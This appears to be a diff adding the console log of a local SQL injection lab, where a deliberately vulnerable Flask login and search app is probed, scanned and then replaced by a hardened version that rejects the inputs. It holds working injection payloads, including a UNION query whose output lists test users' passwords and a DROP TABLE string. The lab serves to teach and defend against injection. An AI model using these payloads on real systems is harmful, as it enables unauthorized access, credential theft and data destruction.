@@ -1,0 +1,66 @@
+/home/cloud-lab-user/sqli_lab
+
+Collecting flask
+  Downloading Flask-3.0.2-py3-none-any.whl
+Collecting requests
+  Downloading requests-2.31.0-py3-none-any.whl
+Installing collected packages: flask, requests
+Successfully installed flask-3.0.2 requests-2.31.0
+
+ * Running on http://127.0.0.1:5000
+ * Debug mode: on
+ * Restarting with stat
+ * Debugger PIN: 874-221-903
+
+--- Manual SQL Injection Tests ---
+
+Payload: admin'--
+Result:
+Login successful!
+Executed Query:
+SELECT * FROM users WHERE username = 'admin'--' AND password = ''
+
+Payload: ' OR '1'='1
+Result:
+Login successful!
+Executed Query:
+SELECT * FROM users WHERE username = '' OR '1'='1' AND password = ''
+
+Payload: ' OR 1=1--
+Search Results:
+[('admin', 'admin@test.com'), ('john', 'john@test.com'), ('jane', 'jane@test.com')]
+
+Payload: ' UNION SELECT username,password,email FROM users--
+Search Results:
+[('admin', 'admin123', 'admin@test.com'),
+ ('john', 'pass123', 'john@test.com'),
+ ('jane', 'secret456', 'jane@test.com')]
+
+--- SQL Injection Detector Output ---
+
+Scan complete. See sqli_report.txt
+
+Error-Based SQLi detected using payload: '
+Union-Based SQLi detected using payload: ' UNION SELECT username,password,email FROM users--
+Boolean-Based SQLi detected using payload: ' OR '1'='1
+
+--- Secure Application Startup ---
+
+ * Running on http://127.0.0.1:5001
+ * Debug mode: off
+
+--- Secure Application Testing ---
+
+admin / admin123 => Login successful
+
+admin'-- => Invalid input
+' OR '1'='1 => Invalid input
+'; DROP TABLE users;-- => Invalid input
+
+--- Secure SQL Injection Scan ---
+
+Scan complete. See sqli_report.txt
+
+(no output – file is empty)
+
+All SQL Injection attempts successfully blocked.
